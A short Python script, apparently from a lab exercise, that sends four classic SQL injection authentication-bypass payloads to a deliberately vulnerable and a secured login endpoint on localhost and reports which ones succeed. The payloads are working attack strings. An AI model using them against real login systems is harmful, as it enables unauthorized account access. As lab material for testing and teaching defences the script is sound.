import requests

URLS = [
    "http://127.0.0.1:5000/vulnerable/login",
    "http://127.0.0.1:5000/secure/login"
]

payloads = [
    ("' OR '1'='1", "anything"),
    ("admin' --", "pass"),
    ("' UNION SELECT 'x','x'--", "abc"),
    ("' OR 1=1--", "123")
]

for url in URLS:
    print(f"\nTesting: {url}")
    for user, pw in payloads:
        resp = requests.post(url, data={"username": user, "password": pw})
        if "Welcome" in resp.text:
            print(f"✅ Injection worked with {user}")
        else:
            print(f"❌ Blocked for {user}")

